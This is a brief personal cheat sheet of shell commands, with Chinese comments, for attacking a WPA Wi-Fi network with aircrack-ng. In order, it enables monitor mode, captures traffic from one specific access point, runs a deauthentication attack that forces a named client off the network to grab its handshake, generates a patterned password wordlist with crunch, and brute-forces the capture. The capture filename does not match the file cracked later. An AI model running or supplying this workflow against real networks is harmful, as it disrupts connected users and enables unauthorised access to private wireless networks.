iwconfig
ifconfig wlo1 down
#这一步会关掉网络
airmon-ng check kill
iwconfig wlo1 mode monitor
ifconfig wlo1 up
iwconfig

apt install airgraph-ng
airodump-ng wlo1

#看某一特定mac的
airodump-ng --bssid 16:75:90:46:5B:E0 --channel 11 wlo1
airodump-ng --bssid 16:75:90:46:5B:E0 --channel 11 --write aa.log wlo1

 aireplay-ng --deauth 4 -a 16:75:90:46:5B:E0 -c B0:55:08:C8:06:F4 wlo1


apt install crunch
# 最小 最大 组成 -t格式 -o文件
crunch 10 10 123456789 -t xkw@@@@@@@ -o yy.txt

aircrack-ng wl1.log-01.cap -w yy.txt


